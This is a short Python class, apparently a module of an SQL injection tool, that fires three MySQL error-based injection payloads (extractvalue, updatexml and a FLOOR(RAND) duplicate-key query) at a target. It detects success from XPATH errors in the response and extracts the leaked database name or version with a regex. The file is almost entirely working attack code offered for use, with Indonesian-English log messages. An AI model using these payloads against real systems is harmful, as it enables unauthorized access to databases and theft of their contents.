class ErrorBased:
    def __init__(self, req, parser, logger, args):
        self.req = req
        self.parser = parser
        self.logger = logger
        self.args = args

    def run(self):
        payloads = [
            "' AND extractvalue(1,concat(0x7e,database()))-- -",
            "' AND updatexml(1,concat(0x7e,version()),1)-- -",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        ]
        for p in payloads:
            resp = self.req.get_text(p)
            if "XPATH" in resp or "~" in resp:
                self.logger.success(f"Error-based work: {p}")
                import re
                m = re.search(r"~([^~]+)~", resp)
                if m:
                    self.logger.success(f"Data: {m.group(1)}")
                return
        self.logger.info("Error-based tidak work")
